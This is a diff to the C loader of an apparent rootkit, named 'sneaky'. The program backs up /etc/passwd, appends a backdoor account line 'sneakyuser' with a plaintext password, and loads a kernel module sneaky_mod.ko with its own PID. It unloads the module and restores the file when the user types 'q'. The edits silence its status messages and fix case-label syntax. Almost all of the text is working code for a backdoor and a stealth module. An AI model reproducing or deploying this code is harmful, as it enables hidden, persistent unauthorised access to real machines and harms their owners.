@@ -23,11 +23,11 @@ int main(void){
 				case -1:
 					printf("file_mod fork failed!\n");
 					break;
-				case 0: 
+				case 0:; 
 					//copy the /etc/passwd file to a new file /tmp/passwd
 					//open the /etc/passwd file and print a new line to the end of the file that contains
 					//sneakyuser:abc123:2000:2000:sneakyuser:/root:bash
-					printf("copying passwd file\n");
+					//printf("copying passwd file\n");
 					char *cmd1[] = {"cp", "-f", "/etc/passwd", "/tmp/passwd", 0}; //'cp /etc/passwd /tmp/passwd' cmd
 					//open("/tmp/passwd", O_RDWR | O_CREAT | S_IRUSR | S_IRGRP | S_IROTH);
 					execvp(cmd1[0], cmd1);
@@ -36,7 +36,7 @@ int main(void){
 					//wrtie new lines to /etc/passwd
 					waitpid(file_mod_pid, NULL, 0);
 					//sleep(WAIT_TIME);
-					printf("TODO: write new lines to /etc/passwd\n");
+					//printf("TODO: write new lines to /etc/passwd\n");
 					int fd;
 					char * abs_path = "/etc/passwd";
 					char * sneakyuser = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
@@ -44,7 +44,7 @@ int main(void){
 						perror("Cannot open output file\n"); exit(1);
 					}
 					write(fd, sneakyuser, strlen(sneakyuser));
-					printf("/etc/passwd modified\n");
+					//printf("/etc/passwd modified\n");
 					close (fd);
 					exit(0); 
 			}
@@ -56,10 +56,10 @@ int main(void){
 				case -1:
 					printf("kernel_mod fork failed!\n");
 					break;
-				case 0: 
+				case 0:; 
 					//Load kernel here
 					//sleep(WAIT_TIME);
-					printf("TODO: insmod kernel\n");
+					//printf("TODO: insmod kernel\n");
 					//TODO: verify this is working
 					char arg[1024];
 					sprintf(arg, "myPID=%d", myPID);
@@ -78,22 +78,22 @@ int main(void){
 							//printf("TMP: %s\n", tmp);
 							if(strcmp(tmp, "q\n") == 0 || strcmp(tmp, "Q\n") == 0){
 								//printf("Q FOUND Input: %s\n", tmp);
-								printf("TODO: unload kernel and restore passwd file\n");
+								//printf("TODO: unload kernel and restore passwd file\n");
 								
 								int cleanup_pid = fork();
 								switch(cleanup_pid){
 									case -1:
 										printf("failed to cleanup!\n");
 										break;
-									case 0:
+									case 0:;
 										//Remove kernel here
-										printf("TODO: rmmod kernel\n");
+										//printf("TODO: rmmod kernel\n");
 										//TODO: verify this is working
 										char *rmmod[] = {"rmmod", "sneaky_mod.ko", 0};
 										execvp(rmmod[0], rmmod);
 										exit(0);
-									default:
-										printf("restoring /tmp/passwd file\n");
+									default:;
+										//printf("restoring /tmp/passwd file\n");
 										char *cp_cmd[] = {"cp", "/tmp/passwd", "/etc/passwd", 0}; //'rm /etc/passwd' cmd
 										waitpid(cleanup_pid, NULL, 0);
 										execvp(cp_cmd[0], cp_cmd);
